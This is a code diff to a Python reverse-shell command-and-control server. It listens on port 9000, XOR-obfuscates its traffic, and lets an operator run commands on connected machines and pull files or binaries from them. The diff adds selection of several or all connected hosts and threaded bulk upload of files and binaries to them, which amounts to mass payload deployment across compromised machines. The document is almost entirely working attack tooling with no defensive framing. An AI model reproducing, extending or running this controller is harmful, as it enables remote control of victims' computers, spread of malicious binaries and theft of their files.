@@ -1,5 +1,8 @@
+#!/usr/bin/python
+
 import socket
-from thread import *
+from thread import start_new_thread
+import threading
 import sys
 from time import sleep
 
@@ -25,11 +28,72 @@ def recv_comm(recv_size,cur_host_con):
         decode[i] ^=0x41
     return decode
 
+def Make_File(remoteFileName,fileToRead,cur_host_con,cur_host_id):
+    res = send_comm('getFile',cur_host_con)
+    if res == 1:
+        handler.remove_host(cur_host_id)
+        return 1
+    res = send_comm(remoteFileName,cur_host_con)
+    if res == 1:
+        handler.remove_host(cur_host_id)
+        return 1
+    decode = recv_comm(1024,cur_host_con)
+    if decode == "fna":
+        return 2
+    else:
+        fileToRead = open(fileToRead,'r')
+        command = fileToRead.read()
+        fileToRead.close()
+        fSize = len(command) + 1024
+        fSize = str(fSize)
+        res = send_comm(fSize, cur_host_con)
+        if res == 1:
+            handler.remove_host(cur_host_id)
+            return 1
+        res = send_comm(command,cur_host_con)
+        if res == 1:
+            handler.remove_host(cur_host_id)
+            return 1
+        decode = recv_comm(1024,cur_host_con)
+        return 0
+
+def Make_Binary(remoteBinName, binToRead, cur_host_con, cur_host_id):
+    res = send_comm('getBinary',cur_host_con)
+    if res == 1:
+        handler.remove_host(cur_host_id)
+        return 1
+    res = send_comm(remoteBinName,cur_host_con)
+    if res == 1:
+        handler.remove_host(cur_host_id)
+        return 1
+    decode = recv_comm(1024,cur_host_con)
+    if decode == "fna":
+        return 2
+    else:
+        binToRead = open(binToRead,'rb')
+        command = binToRead.read()
+        binToRead.close()
+        bSize = len(command) + 1024
+        bSize = str(bSize)
+        res = send_comm(bSize,cur_host_con)
+        sleep(0.1)
+        if res == 1:
+            handler.remove_host(cur_host_id)
+            return 1
+        res = send_comm(command,cur_host_con)
+        if res == 1:
+            handler.remove_host(cur_host_id)
+            return 1
+        decode = recv_comm(3072,cur_host_con)
+        return 0
+
 def list_root_commands():
     print ("List of Server Commands")
     print ("$List_Commands -> Display this list")
     print ("$List_Hosts -> Display connected hosts")
     print ("$Choose_Host host_no -> Select host from list")
+    print ("$Select (commaSeperatedHostIDs) -> Select specified hosts")
+    print ("$ALL -> Select all hosts and display available commands")
     print ("$Exit -> Exit this program")
 
 def list_connected_commands():
@@ -40,6 +104,15 @@ def list_connected_commands():
     print ("$Pull_File remoteFileName (localFileName)-> Get remote file")
     print ("$Pull_Binary remoteBinaryName (localBinaryName)-> Get remote binary")
     print ("$Close_Connection -> Close Connection and remove host")
+    print ("$Exit -> Exit to the main interface")
+
+def list_connected_mult_commands():
+    print ("List of Commands when ALL Host are Selected")
+    print ("$List_Commands -> Display this list")
+    print ("$List_Sel_Hosts -> Display selected hosts")
+    print ("$Make_File localFileName (remoteFileName)-> Create remote file")
+    print ("$Make_Binary localBinaryName (remoteBinaryName)-> Create remote binary")
+    print ("$Close_Connection -> close connection with and remove all selected hosts")
     print ("$Exit -> Exit to the main interface")
 
 class rev_shell_client_main():
@@ -62,7 +135,7 @@ try:
 except:
     max_conns = 5
 
-command_dict = {"List_Commands":0,"List_Hosts":1,"Choose_Host":2,"Exit":3}
+command_dict = {"List_Commands":0,"List_Hosts":1,"Choose_Host":2,"Select":3,"ALL":4,"Exit":5}
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.bind(("0.0.0.0",9000))
 s.listen(max_conns)
@@ -116,85 +189,40 @@ while True:
                 list_connected_commands()
             elif comm_body == "Make_File":
                 try:
-                    fileToRead = open(command[1],'r')
+                    fileToRead = command[1]
                 except:
-                    print ("Local file not provided or not present")
+                    print ("Local file not provided")
                     continue
                 try:
                     remoteFileName = command[2]
                 except:
                     remoteFileName = command[1]
-                res = send_comm('getFile',cur_host_con)
+                res = Make_File(remoteFileName, fileToRead, cur_host_con, cur_host_id)
                 if res == 1:
-                    print ("Connection closed by client")
-                    handler.remove_host(cur_host_id)
+                    print ("Connection Closed by client")
                     break
-                res = send_comm(remoteFileName,cur_host_con)
-                if res == 1:
-                    print ("Connection closed by client")
-                    handler.remove_host(cur_host_id)
-                    break
-                decode = recv_comm(1024,cur_host_con)
-                if decode == "fna":
+                elif res == 2:
                     print ("Access Denied")
                     continue
-                else:
-                    command = fileToRead.read()
-                    fileToRead.close()
-                    fSize = len(command) + 1024
-                    fSize = str(fSize)
-                    res = send_comm(fSize, cur_host_con)
-                    if res == 1:
-                        print ("Connection closed by client")
-                        handler.remove_host(cur_host_id)
-                        break
-                    res = send_comm(command,cur_host_con)
-                    if res == 1:
-                        print ("Connection closed by client")
-                        handler.remove_host(cur_host_id)
-                        break
-                    decode = recv_comm(1024,cur_host_con)
+                print ("File Transfered Successfully!")
             elif comm_body == "Make_Binary":
                 try:
-                    binToRead = open(command[1],'rb')
+                    binToRead = command[1]
                 except:
-                    print ("Local binary not provided or not present")
+                    print ("Local binary not provided")
                     continue
                 try:
                     remoteBinName = command[2]
                 except:
                     remoteBinName = command[1]
-                res = send_comm('getBinary',cur_host_con)
-                if res == 1:
-                    print ("Connection closed by client")
-                    handler.remove_host(cur_host_id)
+                res = Make_Binary(remoteBinName, binToRead, cur_host_con, cur_host_id)
+                if res ==  1:
+                    print ("Connection Closed by client")
                     break
-                res = send_comm(remoteBinName,cur_host_con)
-                if res == 1:
-                    print ("Connection closed by client")
-                    handler.remove_host(cur_host_id)
-                    break
-                decode = recv_comm(1024,cur_host_con)
-                if decode == "fna":
+                elif res == 2:
                     print ("Access Denied")
                     continue
-                else:
-                    command = binToRead.read()
-                    binToRead.close()
-                    bSize = len(command) + 1024
-                    bSize = str(bSize)
-                    res = send_comm(bSize,cur_host_con)
-                    sleep(0.1)
-                    if res == 1:
-                        print ("Connection closed by client")
-                        handler.remove_host(cur_host_id)
-                        break
-                    res = send_comm(command,cur_host_con)
-                    if res == 1:
-                        print ("Connection closed by client")
-                        handler.remove_host(cur_host_id)
-                        break
-                    decode = recv_comm(3072,cur_host_con)
+                print ("Binary Transfered Successfully!")
             elif comm_body == "Pull_File":
                 try:
                     remoteFileName = command[1]
@@ -275,21 +303,164 @@ while True:
                 for part in com_reconst:
                     command += part + " "
                 command = command[:len(command)-1]
-                encode = bytearray(command)
-                for i in range(len(encode)):
-                    encode[i] ^=0x41
-                try:
-                    cur_host_con.send(encode)
-                    en_data = cur_host_con.recv(3072)
-                    decode = bytearray(en_data)
-                    for i in range(len(decode)):
-                        decode[i] ^=0x41
-                    print (decode)
-                except:
+                res = send_comm(command,cur_host_con)
+                if res == 1:
                     print ("Connection closed by client")
-                    handler.remove_host(cur_host_id)
                     break
+                decode = recv_comm(3072,cur_host_con)
+                print (decode)
     elif translated == 3:
+        try:
+            hosts_string = command[1]
+        except:
+            print ("No host IDs provided")
+        list_of_selected_hosts = []
+        try:
+            hosts_string = hosts_string.split(",")
+            for host_ID in hosts_string:
+                list_of_selected_hosts.append(int(host_ID.replace(" ","")))
+        except:
+            print ("Host IDs not integers")
+            continue
+        list_connected_mult_commands()
+        while True:
+            command = raw_input("[MULTIPLE]~$ ")
+            command = command.split(" ")
+            comm_body = command[0]
+            if comm_body == "List_Commands":
+                list_connected_mult_commands()
+            elif comm_body == "List_Sel_Hosts":
+                active_hosts = handler.return_list_of_hosts()
+                for host_ID in list_of_selected_hosts:
+                    print ("["+str(host_ID)+"] "+active_hosts[host_ID][1][0]+":"+str(active_hosts[host_ID][1][1]))
+            elif comm_body == "Make_File":
+                try:
+                    fileToRead = command[1]
+                except:
+                    print ("Local file not provided")
+                    continue
+                try:
+                    remoteFileName = command[2]
+                except:
+                    remoteFileName = command[1]
+                jobs = []
+                active_hosts = handler.return_list_of_hosts()
+                for host_at_hand in list_of_selected_hosts:
+                    t =threading.Thread(target=Make_File,args=(remoteFileName,fileToRead,active_hosts[host_at_hand][0],host_at_hand))
+                    jobs.append(t)
+                for j in jobs:
+                    j.start()
+                for j in jobs:
+                    j.join()
+                print ("Files Transfered Successfully!")
+            elif comm_body == "Make_Binary":
+                try:
+                    binToRead = command[1]
+                except:
+                    print ("Local binary not provided")
+                    continue
+                try:
+                    remoteBinName = command[2]
+                except:
+                    remoteBinName = command[1]
+                jobs = []
+                active_hosts = handler.return_list_of_hosts()
+                for host_at_hand in list_of_selected_hosts:
+                    t =threading.Thread(target=Make_Binary,args=(remoteBinName,binToRead,active_hosts[host_at_hand][0],host_at_hand))
+                    jobs.append(t)
+                for j in jobs:
+                    j.start()
+                for j in jobs:
+                    j.join()
+                print ("Binaries Transfered Successfully!")
+            elif comm_body == "Close_Connection":
+                jobs = []
+                active_hosts = handler.return_list_of_hosts()
+                for j in range(len(list_of_selected_hosts)-1,-1,-1):
+                    host_at_hand = list_of_selected_hosts[j]
+                    active_hosts[host_at_hand][0].close()
+                    handler.remove_host(host_at_hand)
+                break
+            elif comm_body == "Exit":
+                break
+    elif translated == 4:
+        active_hosts = handler.return_list_of_hosts()
+        list_of_selected_hosts = []
+        for host_ID in range(len(active_hosts)):
+            list_of_selected_hosts.append(host_ID)
+        list_connected_mult_commands()
+        while True:
+            command = raw_input("[ALL]~$ ")
+            command = command.split(" ")
+            comm_body = command[0]
+            if comm_body == "List_Commands":
+                list_connected_mult_commands()
+            elif comm_body == "List_Sel_Hosts":
+                active_hosts = handler.return_list_of_hosts()
+                list_of_selected_hosts = []
+                for host_ID in range(len(active_hosts)):
+                    list_of_selected_hosts.append(host_ID)
+                for i in range(len(active_hosts)):
+                    print ("["+str(i)+"] "+active_hosts[i][1][0]+":"+str(active_hosts[i][1][1]))
+            elif comm_body == "Make_File":
+                try:
+                    fileToRead = command[1]
+                except:
+                    print ("Local file not provided")
+                    continue
+                try:
+                    remoteFileName = command[2]
+                except:
+                    remoteFileName = command[1]
+                jobs = []
+                active_hosts = handler.return_list_of_hosts()
+                list_of_selected_hosts = []
+                for host_ID in range(len(active_hosts)):
+                    list_of_selected_hosts.append(host_ID)
+                for host_at_hand in list_of_selected_hosts:
+                    t =threading.Thread(target=Make_File,args=(remoteFileName,fileToRead,active_hosts[host_at_hand][0],host_at_hand))
+                    jobs.append(t)
+                for j in jobs:
+                    j.start()
+                for j in jobs:
+                    j.join()
+                print ("Files Transfered Successfully!")
+            elif comm_body == "Make_Binary":
+                try:
+                    binToRead = command[1]
+                except:
+                    print ("Local binary not provided")
+                    continue
+                try:
+                    remoteBinName = command[2]
+                except:
+                    remoteBinName = command[1]
+                jobs = []
+                active_hosts = handler.return_list_of_hosts()
+                list_of_selected_hosts = []
+                for host_ID in range(len(active_hosts)):
+                    list_of_selected_hosts.append(host_ID)
+                for host_at_hand in list_of_selected_hosts:
+                    t =threading.Thread(target=Make_Binary,args=(remoteBinName,binToRead,active_hosts[host_at_hand][0],host_at_hand))
+                    jobs.append(t)
+                for j in jobs:
+                    j.start()
+                for j in jobs:
+                    j.join()
+                print ("Binaries Transfered Successfully!")
+            elif comm_body == "Close_Connection":
+                active_hosts = handler.return_list_of_hosts()
+                list_of_selected_hosts = []
+                for host_ID in range(len(active_hosts)):
+                    list_of_selected_hosts.append(host_ID)
+                for j in range(len(list_of_selected_hosts)-1,-1,-1):
+                    host_at_hand = list_of_selected_hosts[j]
+                    active_hosts[host_at_hand][0].close()
+                    handler.remove_host(host_at_hand)
+                break
+            elif comm_body == "Exit":
+                break
+    elif translated == 5:
         sys.exit()
     
 
